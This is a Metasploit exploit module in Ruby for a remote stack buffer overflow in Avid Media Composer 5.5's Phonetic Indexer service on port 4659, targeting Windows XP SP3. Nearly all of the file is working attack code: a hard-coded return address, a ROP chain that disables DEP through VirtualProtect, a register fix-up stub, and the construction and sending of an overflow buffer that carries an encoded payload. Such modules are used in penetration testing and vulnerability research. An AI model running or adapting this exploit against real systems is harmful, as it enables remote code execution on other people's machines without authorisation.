##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Avid Media Composer 5.5 - Avid Phonetic Indexer Stack Overflow",
			'Description'    => %q{
					This module exploits a stack buffer overflow in process
				AvidPhoneticIndexer.exe (port 4659), which comes as part of the Avid Media Composer
				5.5 Editing Suite. This daemon sometimes starts on a different port; if you start
				it standalone it will run on port 4660.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'vt [nick.freeman@security-assessment.com]', 
				],
			'References'     =>
				[
					[ 'URL', 'http://www.security-assessment.com/files/documents/advisory/Avid_Media_Composer-Phonetic_Indexer-Remote_Stack_Buffer_Overflow.pdf' ],
				],
			'Payload'        =>
				{
					'Space'    => 1012,
					'BadChars' => "\x00\x09\x0a\x0d\x20",
					'DisableNops' => true,
					'EncoderType' => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'EAX',
						}
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows XP Professional SP3',
						{
							'Ret' => 0x028B35EB #ADD ESP, 1800; RET (il.dll)
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => "Nov 29 2011",
			'DefaultTarget'  => 0))

		register_options(
			[
				Opt::RPORT(4659),
			], self.class)
	end

	def exploit
		rop_gadgets = [
			# ROP chain (sayonara) courtesy of WhitePhosphorus (thanks guys!)
			# a non-sayonara ROP would be super easy too, I'm just lazy :)
			0x7C344CC1,  # pop eax;ret;
			0x7C3410C2, # pop ecx;pop ecx;ret;
			0x7C342462, # xor chain; call eax {0x7C3410C2}
			0x7C38C510, # writeable location for lpflOldProtect
			0x7C365645, # pop esi;ret;
			0x7C345243, # ret;
			0x7C348F46, # pop ebp;ret;
			0x7C3487EC, # call eax
			0x7C344CC1, # pop eax;ret;
			0xfffffbfc, # {size}
			0x7C34D749, # neg eax;ret; {adjust size}
			0x7C3458AA, # add ebx, eax;ret; {size into ebx}
			0x7C3439FA, # pop edx;ret;
			0xFFFFFFC0, # {flag}
			0x7C351EB1, # neg edx;ret; {adjust flag}
			0x7C354648, # pop edi;ret;
			0x7C3530EA, # mov eax,[eax];ret;
			0x7C344CC1, # pop eax;ret;
			0x7C37A181, # (VP RVA + 30) - {0xEF adjustment}
			0x7C355AEB, # sub eax,30;ret;
			0x7C378C81, # pushad; add al,0xef; ret;
			0x7C36683F, # push esp;ret;
		].pack("V*")

		# need to control a buffer reg for the msf gen'd payload to fly. in this case:
		bufregfix = "\x8b\xc4"       # MOV EAX,ESP
		bufregfix += "\x83\xc0\x10"  # ADD EAX,10

		connect
		sploit  = ''
		sploit << rand_text_alpha_upper(216)
		sploit << [target.ret].pack('V*')
		sploit << "A"*732  #This avoids a busted LoadLibrary
		sploit << rop_gadgets
		sploit << bufregfix
		sploit << "\xeb\x09"
		sploit << rand_text_alpha_upper(9)
		sploit << payload.encoded
		sock.put(sploit)
		handler
		disconnect
	end

end